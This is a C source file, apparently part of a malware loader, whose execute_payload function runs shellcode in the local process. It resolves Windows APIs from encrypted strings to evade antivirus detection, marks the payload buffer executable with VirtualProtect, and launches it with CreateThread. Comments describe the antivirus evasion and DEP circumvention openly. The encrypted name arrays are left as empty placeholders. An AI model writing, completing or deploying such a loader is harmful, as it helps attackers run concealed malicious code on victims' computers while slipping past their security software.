#include "config.h"
#include "injection.h"
#include "evasion.h"
#include <stdio.h>

// used to cast generic API function pointer (FARPROC)
typedef BOOL (WINAPI *pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD (WINAPI *pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);

bool execute_payload(char* payload_buffer, SIZE_T payload_size) {

    char enc_kernel32[] = { /* kernel32.dll\0 */ };
    char enc_VirtProtect[] = { /* VirtualProtect\0 */ };
    char enc_CreateThrd[] = { /* CreateThread\0 */ };
    char enc_WaitSingle[] = { /* WaitForSingleObject\0 */ };

    // --- dynamic resolution

    pVirtualProtect fnVirtualProtect = (pVirtualProtect) resolve_api(enc_kernel32, sizeof(enc_kernel32), enc_VirtProtect, sizeof(enc_VirtProtect), GLOBAL_KEY, GLOBAL_KEY_LEN);
    pCreateThread fnCreateThread = (pCreateThread) resolve_api(enc_kernel32, sizeof(enc_kernel32), enc_CreateThrd, sizeof(enc_CreateThrd), GLOBAL_KEY, GLOBAL_KEY_LEN);
    pWaitForSingleObject fnWaitForSingleObject = (pWaitForSingleObject) resolve_api(enc_kernel32, sizeof(enc_kernel32), enc_WaitSingle, sizeof(enc_WaitSingle), GLOBAL_KEY, GLOBAL_KEY_LEN);
    
    // if AV blocks a function -> return
    if (!fnVirtualProtect || !fnCreateThread || !fnWaitForSingleObject) return false;

    // --- prepare memory (DEP bypass del DEP)

    DWORD oldProtect = 0;
    
    // change buffer permission: from PAGE_READWRITE to PAGE_EXECUTE_READ
    bool protect_success = fnVirtualProtect(payload_buffer, payload_size, PAGE_EXECUTE_READ, &oldProtect);
    
    // if AV blocks permission change -> return
    if (!protect_success) {
        return false;
    }

    // --- execute
    
    HANDLE hThread = NULL;
    DWORD threadId = 0;

    // create a new thread inside current process (Local Injection)
    hThread = fnCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload_buffer, NULL, 0, &threadId);

    if (hThread == NULL) {
        return false; // execution failed
    }

    // freeze current process
    fnWaitForSingleObject(hThread, INFINITE);

    return true;
}